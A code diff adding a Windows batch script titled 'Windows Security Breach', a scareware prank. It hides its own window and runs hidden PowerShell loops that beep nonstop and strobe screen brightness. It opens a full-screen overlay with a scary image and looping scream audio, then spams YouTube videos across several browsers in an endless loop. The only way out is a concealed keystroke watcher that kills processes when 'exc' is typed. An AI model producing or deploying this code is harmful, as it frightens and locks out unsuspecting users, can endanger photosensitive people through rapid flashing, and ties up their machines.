@@ -1,0 +1,36 @@
+@echo off
+title Windows Security Breach
+:: Hide the main window instantly
+if not "%~1"=="hidden" (
+    echo CreateObject("Wscript.Shell").Run "cmd /c ""%~f0"" hidden", 0, False > "%temp%\h.vbs"
+    wscript "%temp%\h.vbs"
+    del "%temp%\h.vbs"
+    exit
+)
+
+:: 1. Start the loud banging noise (PowerShell background loop)
+start /b powershell -window hidden -c "while($true) { [console]::beep(100, 300); [console]::beep(150, 200) }"
+
+:: 2. Start the brightness flashing (PowerShell background loop)
+start /b powershell -window hidden -c "while($true) { (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 100); Start-Sleep -m 200; (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 0); Start-Sleep -m 200 }"
+
+:: 3. Start the terrifying full-screen overlay (mshta) with your scary image
+start /b mshta "javascript:var s='<html><body style=background-color:black;margin:0;overflow:hidden;><img src=https://raw.githubusercontent.com/ExcluseDev/scotty-sim/main/scaryback.png style=width:100vw;height:100vh;object-fit:cover;filter:brightness(0.5) contrast(2);><audio autoplay loop><source src=https://www.myinstants.com/media/sounds/scream.mp3 type=audio/mpeg></audio></body></html>';document.write(s);window.moveTo(0,0);window.resizeTo(screen.width,screen.height);"
+
+:: 4. Open the NEW video EXACTLY ONCE
+start "" "https://www.youtube.com/watch?v=UMWyh0VilWk"
+
+:: 5. The Browser Spam Loop
+:spam
+:: Open the original Scottys video in different browsers
+start "" msedge "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+start "" chrome "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+start "" firefox "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+start "" "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+
+:: 6. The Keylogger Escape Hatch (Watches for 'exc')
+start /b powershell -window hidden -c "$seq=''; while($true) { $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); if ($key.Character -match '[a-z]') { $seq += $key.Character; if ($seq.Length -gt 3) { $seq = $seq.Substring(1) }; if ($seq -eq 'exc') { taskkill /F /IM mshta.exe; taskkill /F /IM powershell.exe; taskkill /F /IM cmd.exe; exit } } }"
+
+:: Wait 1 second and loop back to spam more
+timeout /t 1 /nobreak >nul
+goto spam
